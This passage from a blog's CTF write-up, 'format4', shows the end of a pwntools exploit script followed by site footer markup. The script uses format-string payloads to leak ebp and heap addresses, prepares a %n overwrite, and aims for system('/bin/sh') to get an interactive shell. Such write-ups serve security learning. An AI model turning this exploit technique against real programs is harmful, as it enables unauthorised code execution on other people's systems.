+log.success(&#39;get system addr: &#39; + hex(system_addr))
+log.success(&#39;get binsh addr: &#39; + hex(binsh_addr))
+
+
+
+##gdb.attach(sh)
+
+#--------------------------------第二次输入--------------------------------------
+
+## get heap addr and ebp addr
+payload = flat([
+    system_addr,
+    &#39;bbbb&#39;,
+    binsh_addr,
+    &#39;%6$p%11$pcccc&#39;,
+])
+createcontact(&#39;2222&#39;, &#39;2222&#39;, &#39;222&#39;, payload)
+printcontact()
+sh.recvuntil(&#39;Description: &#39;)
+data = sh.recvuntil(&#39;cccc&#39;, drop=True)
+data = data.split(b&#39;0x&#39;)
+print(data)
+ebp_addr = int(data[1], 16)
+heap_addr = int(data[2], 16)
+
+#--------------------------------第三次输入--------------------------------------
+&#39;&#39;&#39;
+## modify ebp
+part1 = (heap_addr - 4) / 2
+part2 = heap_addr - 4 - part1
+payload = &#39;%&#39; + str(part1) + &#39;x%&#39; + str(part2) + &#39;x%6$n&#39;
+##print payload
+createcontact(&#39;3333&#39;, &#39;123456789&#39;, &#39;300&#39;, payload)
+printcontact()
+sh.recvuntil(&#39;Description: &#39;)
+sh.recvuntil(&#39;Description: &#39;)
+##gdb.attach(sh)
+print(&#39;get shell&#39;)
+sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)
+##get shell
+sh.sendline(&#39;5&#39;)
+&#39;&#39;&#39;
+sh.interactive()
+</code></pre><p><img loading="lazy" src="/ctf/format4.img/image-20220428172659692.png" alt="image-20220428172659692"  />
+</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://jellyfish-pro.github.io/ctf/format4_new/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>format4_new</span>
+  </a>
+  <a class="next" href="https://jellyfish-pro.github.io/ctf/ret2csuinit_new/">
+    <span class="title">Next »</span>
+    <br>
+    <span>ret2csuinit_new</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="https://jellyfish-pro.github.io">CAI dog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
